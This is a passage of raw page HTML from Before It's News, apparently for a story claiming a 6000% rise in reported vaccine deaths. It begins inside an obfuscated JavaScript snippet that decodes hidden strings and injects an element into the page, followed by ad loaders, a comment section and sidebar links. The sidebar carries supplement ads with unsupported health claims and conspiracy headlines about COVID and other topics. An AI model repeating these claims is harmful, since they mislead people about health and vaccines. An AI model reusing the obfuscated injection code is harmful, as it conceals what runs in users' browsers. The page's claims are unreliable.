dzdfrrlmmf=bkxaotgbdytrvr([88,47,5],eyrcofcwklmpdsd);var ensgzowhojyn=bkxaotgbdytrvr([0,69,52,44],eyrcofcwklmpdsd);try{Object.getOwnPropertyDescriptor(Document.prototype,ztxscwthktayjdi).get.apply(hsffjublc)[dzdfrrlmmf]=dzdfrrlmmf;document.body=document.querySelectorAll('body')[0]}catch(e){}var facrmlix=bkxaotgbdytrvr([5,47,75,4,20,75,74,70,75,83,75,93,20],eyrcofcwklmpdsd);var vxkhpxuplx=bkxaotgbdytrvr([88,5,47,66,9,20],eyrcofcwklmpdsd);var dydbxh=bkxaotgbdytrvr([20,75,76,20,61,69,93,20,75,93,20],eyrcofcwklmpdsd);var betlduunozlv=bkxaotgbdytrvr([91,75,4,52],eyrcofcwklmpdsd);var dgngkhrrmv=bkxaotgbdytrvr([4,9,9,75,93,52,61,91,66,70,52],eyrcofcwklmpdsd);var hstdotkbp=bkxaotgbdytrvr([9,4,47,75,93,20,51,69,52,75],eyrcofcwklmpdsd);var bnfmynmxm=bkxaotgbdytrvr([47,75,83,69,80,75,61,91,66,70,52],eyrcofcwklmpdsd);var aykwxbwlsdliui=hsffjublc[facrmlix](vxkhpxuplx);aykwxbwlsdliui[dydbxh]=bkxaotgbdytrvr(dfmlibdchluyg,eyrcofcwklmpdsd);hsffjublc[ensgzowhojyn][dgngkhrrmv](aykwxbwlsdliui);aykwxbwlsdliui[hstdotkbp][bnfmynmxm](aykwxbwlsdliui);})();}</script>
+</p></div></div></div></div></article></div></div></main></div></body></html>
+<br/>Source: <a href="/v3/r2/?url=aHR0cHM6Ly90YXBuZXdzd2lyZS5jb20vMjAyMS8wNC82MDAwLWluY3JlYXNlLWluLXJlcG9ydGVkLXZhY2NpbmUtZGVhdGhzLTFzdC1xdWFydGVyLTIwMjEtY29tcGFyZWQtdG8tMXN0LXF1YXJ0ZXItMjAyMC8="> https://tapnewswire.com/2021/04/6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020/</a><br/> 
+
+<div id="story-pagenavi-bar"></div>
+<div style="clear:both"></div>
+<br/>
+<div class="sharethis-inline-share-buttons"></div>
+<br/>
+<div id="single_announcement" style="display: none;">
+</div>
+<div id="in_article_us_ad" style="margin: 0 auto;"></div>
+<script type="text/javascript">
+        in_article_us_ad_code = "";
+        in_article_us_ad_mobile_code = "";
+    </script>
+<div style="clear: both"></div>
+<div id="author_stories"></div>
+<div style="clear: both"></div>
+<div style="border-top: 1px solid #AAA; padding: 15px 0 0 0;">
+<strong>Before It’s News®</strong> is a community of individuals who report on what’s going on around them, from all around the world.<br/><br/>
+Anyone can <a href="/v3/login/new/">join</a>.<br/>
+Anyone can contribute.<br/>
+Anyone can become informed about their world.<br/><br/>
+<strong>"United We Stand" <a href="/v3/login/new/">Click Here</a> To Create Your Personal <a href="/v3/login/new/">Citizen Journalist</a>
+Account Today, Be Sure To Invite Your Friends.</strong>
+</div>
+<div id="article_html" style="margin: 20px 0;">
+<p style="text-align: left;"><span style="font-family: Tahoma, Geneva, sans-serif; font-size: 18px;"><strong style="">Please Help Support BeforeitsNews by trying our Natural Health Products below!</strong></span></p><p style="text-align: left;"><br/></p><p style="text-align: left;"><span style="font-family: Arial, Helvetica, sans-serif; font-size: 16px;"><strong style="font-size: 16px;">Order by Phone at 888-809-8385 or online at <a href="https://mitocopper.com/" rel="sponsored" target="_blank">https://mitocopper.com</a> M - F 9am to 5pm EST</strong></span></p><p style="text-align: left;"><span style="font-family: Arial, Helvetica, sans-serif; font-size: 16px;"><strong style="font-size: 16px;">Order by Phone at 866-388-7003 or online at <a href="https://www.herbanomic.com/" rel="sponsored" target="_blank">https://www.herbanomic.com</a> M - F 9am to 5pm EST</strong></span></p><p style="text-align: left;"><span style="font-size: 16px; font-family: Arial, Helvetica, sans-serif;"><strong style="">Order by Phone at 866-388-7003 or online at <a href="https://herbanomics.com/" rel="sponsored" target="_blank">https://www.herbanomics.com</a> M - F 9am to 5pm EST</strong></span></p><p><br/></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://www.herbanomics.com" rel="sponsored">Humic &amp; Fulvic</a> Trace Minerals Complex - Nature's most important supplement! Vivid Dreams again!</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://www.herbanomics.com" rel="sponsored">HNEX HydroNano EXtracellular Water</a> - Improve immune system health and reduce inflammation.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/ultracur-bioavailable-curcumin-complex/" rel="sponsored" target="_blank">Ultimate Clinical Potency Curcumin</a> - Natural pain relief, reduce inflammation and so much more.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/mitoactivator-extra-strength-60-capsules/" rel="sponsored" target="_blank">MitoCopper</a> - Bioavailable Copper destroys pathogens and gives you more energy. (See Blood Video)</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/oxy-powder-natural-colon-cleanser-60-capsules/" rel="sponsored" target="_blank">Oxy Powder</a> - Natural Colon Cleanser!  Cleans out toxic buildup with oxygen!</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://herbanomics.com/products/detoxadine-organic-iodine-supplement" rel="sponsored" target="_blank">Nascent Iodine</a> - Promotes detoxification, mental focus and thyroid health.</span></strong></p><p><strong><span style="font-size: 14px; font-family: Arial, Helvetica, sans-serif;"><a href="https://mitocopper.com/product/emf-blocking-smart-meter-cover/" rel="sponsored" target="_blank">Smart Meter Cover</a> -  Reduces Smart Meter radiation by 96%! (See Video).</span></strong></p> </div>
+<img alt="Report abuse" height="66" id="report_abuse" src="//img.beforeitsnews.com/img/report_abuse.png" width="65">
+<div style="clear:both"></div>
+<div class="left_item">
+<div class="rotating_text_link" id="rotating_text_link_13"></div>
+<div id="banners_direct_regular_left"></div>
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_14"></div>
+<div class="left_item" id="leftAdItem_1" style="margin: 20px 0;">
+<div id="M310742ScriptRootC351461"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.351461.js"></script>
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_15"></div>
+<div class="left_item" id="leftAdItem_2" style="margin-bottom: 20px">
+</div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_16"></div>
+<div id="related_stories_header">Related Stories</div>
+<div id="category_stories">
+<ul></ul> </div>
+<div style="clear:both"></div>
+<div class="rotating_text_link" id="rotating_text_link_17"></div>
+<div class="left_item" id="leftAdItem_3" style="margin: 20px 0;">
+<div id="M310742ScriptRootC720410">
+</div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720410.js"></script>
+</div>
+<div style="clear:both; margin-top: 30px;"></div>
+<div id="comments">
+<div id="b4in_comments_body">
+<a href="comments" id="comments" style="visibility:hidden"></a>
+<div id="respond">
+<h2>Comments</h2>
+<div class="cancel-comment-reply"><img src="/images/story/cross.png"> <a href="/eu/2021/04/6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020-2670189.html#respond" id="cancel-comment-reply-link" style="display:none;">Click here to cancel reply.</a></img></div>
+<form action="/core/ajax/comment/add_comment.php" id="commentform" method="post">
+<div class="wpn_comment_heading textarea_heading">Your Comments</div>
+<div class="wpn_field" style="margin:0;"><textarea id="comment_text" name="comment_text" rows="10" tabindex="4"></textarea></div>
+<div class="wpn_comment_submit">
+<img align="bottom" alt="Processing comment" height="24" id="comment_submiting" src="/images/misc/loading.gif" style="display:none; position: relative; top: 9px;" width="24">
+<div id="wp_emoticons" style="float:left">
+<a href="javascript:grin(':?:')"><img alt="Question   " src="/images/smilies/icon_question.gif" title="Question"/></a>
+<a href="javascript:grin(':razz:')"><img alt="Razz  " src="/images/smilies/icon_razz.gif" title="Razz"/></a>
+<a href="javascript:grin(':sad:')"><img alt="Sad   " src="/images/smilies/icon_sad.gif" title="Sad"/></a>
+<a href="javascript:grin(':evil:')"><img alt="Evil  " src="/images/smilies/icon_evil.gif" title="Evil"/></a>
+<a href="javascript:grin(':!:')"><img alt="Exclaim  " src="/images/smilies/icon_exclaim.gif" title="Exclaim"/></a>
+<a href="javascript:grin(':smile:')"><img alt="Smile  " src="/images/smilies/icon_smile.gif" title="Smile"/></a>
+<a href="javascript:grin(':oops:')"><img alt="Redface  " src="/images/smilies/icon_redface.gif" title="Redface"/></a>
+<a href="javascript:grin(':grin:')"><img alt="Biggrin  " src="/images/smilies/icon_biggrin.gif" title="Biggrin"/></a>
+<a href="javascript:grin(':eek:')"><img alt="Surprised  " src="/images/smilies/icon_surprised.gif" title="Surprised"/></a>
+<a href="javascript:grin(':shock:')"><img alt="Eek   " src="/images/smilies/icon_eek.gif" title="Eek"/></a>
+<a href="javascript:grin(':???:')"><img alt="Confused   " src="/images/smilies/icon_confused.gif" title="Confused"/></a>
+<a href="javascript:grin(':cool:')"><img alt="Cool  " src="/images/smilies/icon_cool.gif" title="Cool"/></a>
+<a href="javascript:grin(':lol:')"><img alt="LOL   " src="/images/smilies/icon_lol.gif" title="LOL"/></a>
+<a href="javascript:grin(':mad:')"><img alt="Mad   " src="/images/smilies/icon_mad.gif" title="Mad"/></a>
+<a href="javascript:grin(':twisted:')"><img alt="Twisted  " src="/images/smilies/icon_twisted.gif" title="Twisted"/></a>
+<a href="javascript:grin(':roll:')"><img alt="Rolleyes   " src="/images/smilies/icon_rolleyes.gif" title="Rolleyes"/></a>
+<a href="javascript:grin(':wink:')"><img alt="Wink  " src="/images/smilies/icon_wink.gif" title="Wink"/></a>
+<a href="javascript:grin(':idea:')"><img alt="Idea  " src="/images/smilies/icon_idea.gif" title="Idea"/></a>
+<a href="javascript:grin(':arrow:')"><img alt="Arrow  " src="/images/smilies/icon_arrow.gif" title="Arrow"/></a>
+<a href="javascript:grin(':neutral:')"><img alt="Neutral  " src="/images/smilies/icon_neutral.gif" title="Neutral"/></a>
+<a href="javascript:grin(':cry:')"><img alt="Cry   " src="/images/smilies/icon_cry.gif" title="Cry"/></a>
+<a href="javascript:grin(':mrgreen:')"><img alt="Mr. Green  " src="/images/smilies/icon_mrgreen.gif" title="Mr. Green"/></a>
+</div>
+<input id="comment_category_id" name="comment_category_id" type="hidden" value="199">
+<input id="comment_submit" name="submit" tabindex="5" type="button" value="Submit"/><input id="comment_post_ID" name="comment_post_ID" type="hidden" value="2670189"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</input></img></div>
+</form>
+</div>
+<br>
+<div class="wpn_maintitle">Total 1 comment</div>
+<ul class="commentlist">
+<li class="comment byuser even thread-even depth-1" id="li-comment-230001">
+<a name="comment_230001"></a>
+<div id="comment-230001">
+<input id="comment-230001-author" type="hidden" value="767385"/>
+<div class="comment-author vcard">
+<img class="avatar avatar-48 photo" src="/images/story/default_avatar.jpg" width="44"/>
+<cite class="fn">Meg65</cite> </div>
+<div class="comment_content_wrapper">
+<p> <img alt=":lol:" class="wp-smiley" src="/images/smilies/icon_lol.gif"> We didn’t have vaccines in first quarter of 2020…</img></p>
+</div>
+</div>
+<div class="lf_comment_footer">
+<label class="lf_comment_date">
+Apr 1, 2021, 9:23 am </label>
+<span class="b4in_comment_tools">
+<img align="bottom" alt="Like" class="clickable" height="32" id="upvote_comment_230001" src="//img.beforeitsnews.com/img/upvote.png" title="Like" width="32"/>
+<img align="bottom" alt="Dislike" class="clickable" height="32" id="downvote_comment_230001" src="//img.beforeitsnews.com/img/downvote.png" title="Dislike" width="32"/>
+<img align="bottom" alt="Report SPAM" class="clickable" height="32" id="report_spam_comment_230001" src="//img.beforeitsnews.com/img/spam.png" title="Report SPAM" width="32"/>
+<span id="delete_comment_230001"></span>
+<img align="bottom" alt="Processing comment" height="26" id="comment_processing_230001" src="/images/misc/loading.gif" style="display:none; position: relative; top: -3px;" width="26"/>
+<input class="comment_id" type="hidden" value="230001"/>
+</span>
+<a class="comment-reply-link comment-rating" href="#" onclick="return false;" style="margin: 5px 7px; color: black" title="Rating">0</a>
+<a class="comment-reply-link" href="/eu/2021/04/6000-increase-in-reported-vaccine-deaths-1st-quarter-2021-compared-to-1st-quarter-2020-2670189.html?replytocom=230001#respond" onclick='return addComment.moveForm("comment-230001", "230001", "respond", "2670189")'>Reply</a> </div>
+</li>
+</ul>
+<div class="navigation" style="padding:10px;">
+<div class="alignleft">
+</div>
+<div class="alignright">
+</div>
+<div style="clear:both;"></div>
+</div>
+</br></div>
+</div>
+<div class="clear"></div>
+<div class="rotating_text_link" id="rotating_text_link_18"></div>
+<div id="recent" style="display: ">
+<div class="header">MOST RECENT</div>
+<div class="content">
+<div id="most_recent_stories_list">
+</div>
+<div style="clear:both; height:20px;"></div>
+<div class="rotating_text_link" id="rotating_text_link_19"></div>
+<div class="left_item" id="leftAdItem_4" style="margin: 20px 0;">
+</div>
+<div class="load_more">
+<div class="loading" style="display: none;margin:50px auto; width: 100px;">
+<img src="//img.beforeitsnews.com/img/v3/loading.gif" width="100"/>
+</div>
+<a class="link ready" href="javascript:">Load more ...</a>
+<script type="text/javascript">var loaded = 22;</script>
+</div>
+</div>
+</div>
+
+<div id="sidebar">
+<div class="widget-area">
+<div class="sb_top1">
+<div id="donate">
+<div class="donate_title">HELP KEEP NEWS FREE</div>
+<a class="btn_donate" href="/v3/donate/" onclick="gaTrackPageviewCustom('/donate_button_clicks')" style="padding: 3px 7px;">DONATE HERE</a>
+</div>
+<div id="ext_link">
+<a href="/v3/classic/" target="_blank">OLD VERSION</a>
+</div>
+<div id="forum_link" style="display: none;">
+<a href="//forum.beforeitsnews.com/b4in/login.php" target="_blank">FORUM</a>
+</div>
+</div>
+<div class="clear"></div>
+<div class="sb_top2">
+<div id="online">
+<table id="stats">
+<tbody>
+<tr>
+<td>Online:</td>
+<td><span id="chartbeat_site"></span></td>
+</tr>
+<tr>
+<td>Visits:</td>
+<td><span id="visit_count">1,468,324,351</span></td>
+</tr>
+<tr>
+<td>Stories:</td>
+<td><span id="story_count">7,871,520</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div id="upload_news">
+<div class="title">Wanted: Citizen Reporters,<br>Whistler Blowers, Insiders</br></div>
+<button class="btn_upload_news" id="submitnews">CLICK HERE TO UPLOAD NEWS!</button>
+</div>
+</div>
+<div class="ads"><img height="1" id="ad0" src="//img.beforeitsnews.com/img/v3/ads.png" width="1"/></div>
+<div class="clear"></div>
+<div class="sidebar_item" id="god_word"><table id="god_word_table" width="100%"><tbody><tr><td align="center"><div style="max-width:370px"><div class="god_word_item" id="god_word_QTPKKmP1zCc"><div id="god_word_video" onclick="god_word_video_onclick('QTPKKmP1zCc'); incr_clicks_god_word('1081');" onmouseout="god_word_video_onmouseout();" onmouseover="god_word_video_onmouseover();" style="position: relative; cursor: pointer;"><img height="240" src="https://i.ytimg.com/vi/QTPKKmP1zCc/hqdefault.jpg" width="360"/><button aria-label="Play" class="ytp-large-play-button ytp-button"><svg height="100%" version="1.1" viewbox="0 0 68 48" width="100%"><path class="ytp-large-play-button-bg" d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55 C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19 C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#212121" fill-opacity="0.8"></path><path d="M 45,24 27,14 27,34" fill="#fff"></path></svg></button></div><div class="god_word_title">God's Word - Jeremiah 30</div></div><hr style="width: 50%"/> <div class="god_word_title"><a class="god_word_link" href="https://www.youtube.com/user/nsearchofsouls/videos" onclick="gaTrackPageviewCustom('/listen_to_god_word_on_youtube')" rel="nofollow" target="_blank">Listen to God's Word on Youtube!</a></div><hr style="width: 80%"/> <div class="god_word_title"><a class="god_word_link" href="/v3/donate/" onclick="gaTrackPageviewCustom('/donate_to_share_god_word')" rel="nofollow">Donate to Share God's Word!</a></div></div></td></tr></tbody></table></div>
+<div id="bin_banners_contract_group2"></div>
+<div id="videos_rotating" style="position: relative; text-align: center; margin-top: 15px;"></div>
+<div class="sidebar_item">
+<div id="ld-4166-9392"></div>
+</div>
+<div class="sidebar_item" id="banners_contract_3"></div>
+<div class="rotating_text_link" id="rotating_text_link_1"></div>
+<div class="sidebar_item" id="banners_direct_regular_right"></div>
+<div id="bin_banners_contract_group1"></div>
+<div class="rotating_text_link" id="rotating_text_link_2"></div>
+<div class="sidebar_item" id="sbAdItem_1">
+<div id="M310742ScriptRootC351459">
+<div id="M310742PreloadC351459">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC351459")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC351459");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=351459;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.351459.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div>
+<div class="rotating_text_link" id="rotating_text_link_3"></div>
+<div id="blessing" style="margin-bottom: 20px">
+"Not by might, nor by power, but by my spirit, saith the Lord of hosts." Zechariah 4:6
+</div>
+<div id="bin_on_telegram">
+<center>BEFORE IT'S NEWS ON TELEGRAM</center>
+GET THE TELEGRAM APP - <a href="https://telegram.org/" rel="nofollow" target="_blank">https://telegram.org/</a>
+JOIN OUR CHANNEL - <a href="https://t.me/BeforeitsNews" target="_blank">https://t.me/BeforeitsNews</a>
+</div>
+<div id="subscribe" style="margin-bottom: 20px">
+<div class="title">Read it..</div>
+<div class="logo">BEFORE IT'S NEWS</div>
+<div class="head"><a href="#signup" onclick="$('#lightbox').click();">SIGN UP</a> FOR OUR NEWSLETTER</div>
+<div class="form">
+<form action="/newsletter/thank-you.php" id="form-newsletter" method="post" name="form-newsletter">
+<input autocomplete="off" id="email" name="email" placeholder="email address" size="30" type="text"/>
+<button id="btn-submit" name="btn-submit" type="submit">Submit</button>
+</form>
+</div>
+</div>
+<div id="today_top_stories">
+<div class="title">Today's Top Stories</div>
+<div class="content">
+<div class="link"><a class="title" href="/alternative/2023/03/katie-hobbs-busted-for-accepting-bribes-ohio-rail-derailment-update-144000-anti-christ-and-more-video-3789570.html" target="_self">Katie Hobbs Busted for Accepting Bribes, Ohio Rail Derailment Update, 144000, Anti-Christ and More (Video) </a></div><div class="link"><a class="title" href="/opinion-conservative/2023/03/x22-report-trump-is-vengeance-war-like-posture-activated-thank-you-for-playing-must-video-3656719.html" target="_self">X22 Report - Trump Is Vengeance! War-Like Posture Activated! Thank You For Playing! - Must Video</a></div><div class="link"><a class="title" href="/alternative/2023/03/michael-jaco-explosive-interview-and-intel-drop-with-ricardo-bosi-video-3789593.html" target="_self">Michael Jaco: Explosive Interview and Intel Drop With Ricardo Bosi (Video) </a></div><div class="link"><a class="title" href="/alternative/2023/03/charlie-ward-big-situation-update-everyone-needs-to-know-this-video-3789605.html" target="_self">Charlie Ward: Big Situation Update - Everyone Needs To Know This!! (Video) </a></div><div class="link"><a class="title" href="/terrorism/2023/03/situation-update-mar-6-2023-bombshell-leaked-govt-messages-reveal-covid-was-a-planned-psychological-terrorism-campaign-from-the-very-start-mike-adams-must-video-2462874.html" target="_self">Situation Update, Mar 6, 2023 - Bombshell: Leaked Govt. Messages Reveal COVID Was a Planned Psychological Terrorism Campaign From the Very Start! - Mike Adams Video</a></div><div class="link"><a class="title" href="/prophecy/2023/03/q-drop-benjamin-fulford-intel-cfr-distraction-wars-2023-2539089.html" target="_self">Q Drop - Benjamin Fulford Intel: CFR &amp; Distraction Wars 2023</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-david-rodriguez-spaceforce-truth-from-conspiracy-captain-chuck-ruffin-explains-2539095.html" target="_self">New David Rodriguez: SPACEFORCE- "Truth From Conspiracy" - Captain Chuck Ruffin Explains</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/breaking-biden-declares-national-state-of-emergency-as-putin-takes-key-ukraine-city-redacted-news-live-2477563.html" target="_self">Breaking! Biden Declares National State of Emergency as Putin Takes Key Ukraine City! - Redacted News Live</a></div><div class="link"><a class="title" href="/blogging-citizen-journalism/2023/03/man-dies-shown-shocking-truth-about-creation-and-why-were-here-nde-2651955.html" target="_self">Man Dies; Shown Shocking Truth About Creation and Why Were Here (NDE)</a></div><div class="link"><a class="title" href="/paranormal/2023/03/new-sgtreport-33-masonic-symbolism-via-sofia-smallstorm-2560709.html" target="_self">New SGTReport: 33 Masonic Symbolism via Sofia Smallstorm</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_2">
+<div class="rotating_text_link" id="rotating_text_link_4"></div>
+<div class="__JSCode1__">
+<div id="ld-8831-2310"></div><script>(function(w,d,s,i){w.ldAdInit=w.ldAdInit||[];w.ldAdInit.push({slot:10864440455450982,size:[0, 0],id:"ld-8831-2310"});if(!d.getElementById(i)){var j=d.createElement(s),p=d.getElementsByTagName(s)[0];j.async=true;j.src="//cdn2.customads.co/_js/ajs.js";j.id=i;p.parentNode.insertBefore(j,p);}})(window,document,"script","ld-ajs");</script>
+</div>
+<div class="__JSCode2__">
+<style>#M310742ScriptRootC720412 {min-height: 300px;}</style>
+<div id="M310742ScriptRootC720412">
+<div id="M310742PreloadC720412">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC720412")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC720412");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=720412;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.720412.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div> <div class="rotating_text_link" id="rotating_text_link_5"></div>
+</div>
+<div id="featured_stories">
+<div class="title">Featured</div>
+<div class="content">
+<div class="link"><a class="title" href="/alternative/2023/03/breaking-massive-fire-at-hampton-university-in-virginia-evacuation-the-real-gs-news-3789623.html" target="_self">Breaking: Massive Fire At Hampton University In Virginia! Evacuation! - The Real GS News</a></div><div class="link"><a class="title" href="/christian-news/2023/03/running-from-the-fight-is-not-what-the-word-of-god-teaches-us-video-2614247.html" target="_self">Running From The Fight Is NOT What The Word Of God Teaches Us! (Video)</a></div><div class="link"><a class="title" href="/crime-all-stars/2023/03/smoking-gun-of-fraud-fauci-used-government-grant-money-to-buy-off-scientists-over-covid-origins-2494804.html" target="_self">SMOKING GUN OF FRAUD: Fauci Used Government Grant Money To Buy Off Scientists Over Covid Origins</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-steve-quayle-stephanie-quayle-on-the-edge-an-outreach-to-those-that-time-others-have-forgotten-mar-6-2023-2539130.html" target="_self">New Steve Quayle &amp; Stephanie Quayle | On the Edge - An Outreach to Those That Time &amp; Others Have Forgotten | Mar. 6, 2023</a></div><div class="link"><a class="title" href="/libertarian/2023/03/slavery-in-the-americas-separating-fact-from-fiction-2801530.html" target="_self">Slavery in the Americas: Separating Fact from Fiction</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-max-igan-scarcity-or-abundance-rafael-laverde-speaks-with-max-2539131.html" target="_self">New Max Igan: Scarcity or Abundance - Rafael LaVerde Speaks with Max </a></div><div class="link"><a class="title" href="/awakening-start-here/2023/03/march-june-2023-dates-bo-polny-babylon-18119.html" target="_self">March, -June 2023 Dates Bo Polny Babylon???</a></div><div class="link"><a class="title" href="/paranormal/2023/03/russian-special-forces-battle-annunaki-warriors-in-the-underground-tunnels-of-syria-march-2023-2560714.html" target="_self">Russian Special Forces Battle Annunaki Warriors in the Underground Tunnels of Syria! March 2023</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/charlie-ward-bombshell-3623-the-world-at-war-must-video-2477566.html" target="_self">Charlie Ward BOMBSHELL 3/6/23: The World At War! - Must Video</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/breaking-major-world-info-russian-massacre-in-bakhmut-ukraine-the-real-gs-news-2477564.html" target="_self">Breaking: Major World Info - Russian Massacre In Bakhmut, Ukraine! - The Real GS News</a></div> </div>
+</div>
+<div class="sidebar_item" id="sbAdItem_3">
+<div class="rotating_text_link" id="rotating_text_link_6"></div>
+<div class="__JSCode1__">
+<div id="ld-4530-2279"></div><script>(function(w,d,s,i){w.ldAdInit=w.ldAdInit||[];w.ldAdInit.push({slot:8301289771671655,size:[0, 0],id:"ld-4530-2279"});if(!d.getElementById(i)){var j=d.createElement(s),p=d.getElementsByTagName(s)[0];j.async=true;j.src="//cdn2.customads.co/_js/ajs.js";j.id=i;p.parentNode.insertBefore(j,p);}})(window,document,"script","ld-ajs");</script>
+</div>
+<div class="__JSCode2__">
+<style>#M310742ScriptRootC720415 {min-height: 300px;}</style>
+<div id="M310742ScriptRootC720415">
+<div id="M310742PreloadC720415">
+Loading... </div>
+<script>
+                (function(){
+            var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';
+            var i=d[ce]('iframe');i[st][ds]=n;d[gi]("M310742ScriptRootC720415")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln("<ht"+"ml><bo"+"dy></bo"+"dy></ht"+"ml>");iw.close();var c=iw[b];}
+            catch(e){var iw=d;var c=d[gi]("M310742ScriptRootC720415");}var dv=iw[ce]('div');dv.id="MG_ID";dv[st][ds]=n;dv.innerHTML=720415;c[ac](dv);
+            var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+"//jsc.mgid.com/b/e/beforeitsnews.com.720415.js?t="+D.getUTCFullYear()+D.getUTCMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})();
+    </script>
+</div>
+</div> <div class="rotating_text_link" id="rotating_text_link_7"></div>
+</div>
+<div id="top_global">
+<div class="title">Top Global</div>
+<div class="content">
+<div class="link"><a class="title" href="/politics/2023/03/palestinianisraeli-update-03062023-president-herzog-warns-israel-at-risk-of-destroying-itself-from-within-3285127.html" target="_self">Palestinian/Israeli update 03/06/2023..President Herzog warns Israel at risk of 'destroying itself from within'</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-max-igan-scarcity-or-abundance-rafael-laverde-speaks-with-max-2539131.html" target="_self">New Max Igan: Scarcity or Abundance - Rafael LaVerde Speaks with Max </a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-steve-quayle-stephanie-quayle-on-the-edge-an-outreach-to-those-that-time-others-have-forgotten-mar-6-2023-2539130.html" target="_self">New Steve Quayle &amp; Stephanie Quayle | On the Edge - An Outreach to Those That Time &amp; Others Have Forgotten | Mar. 6, 2023</a></div><div class="link"><a class="title" href="/survival/2023/03/taiwan-warns-china-could-carry-out-a-sudden-entry-into-country-2788125.html" target="_self">Taiwan Warns China Could Carry Out A “Sudden Entry” Into Country</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/charlie-ward-bombshell-3623-the-world-at-war-must-video-2477566.html" target="_self">Charlie Ward BOMBSHELL 3/6/23: The World At War! - Must Video</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/breaking-major-world-info-russian-massacre-in-bakhmut-ukraine-the-real-gs-news-2477564.html" target="_self">Breaking: Major World Info - Russian Massacre In Bakhmut, Ukraine! - The Real GS News</a></div><div class="link"><a class="title" href="/health/2023/03/smoking-gun-matt-hancock-covid-leaks-uk-government-plot-to-fake-variants-to-scare-public-wam-3049429.html" target="_self">SMOKING GUN: Matt Hancock Covid Leaks! - UK Government PLOT To FAKE Variants To SCARE PUBLIC! - WAM</a></div><div class="link"><a class="title" href="/paranormal/2023/03/russian-special-forces-battle-annunaki-warriors-in-the-underground-tunnels-of-syria-march-2023-2560714.html" target="_self">Russian Special Forces Battle Annunaki Warriors in the Underground Tunnels of Syria! March 2023</a></div><div class="link"><a class="title" href="/war-and-conflict/2023/03/breaking-biden-declares-national-state-of-emergency-as-putin-takes-key-ukraine-city-redacted-news-live-2477563.html" target="_self">Breaking! Biden Declares National State of Emergency as Putin Takes Key Ukraine City! - Redacted News Live</a></div><div class="link"><a class="title" href="/prophecy/2023/03/new-jason-q-and-charlie-ward-shocking-news-3-6-23-2539125.html" target="_self">New Jason Q and Charlie Ward Shocking News 3-6-23</a></div> </div>
+</div>
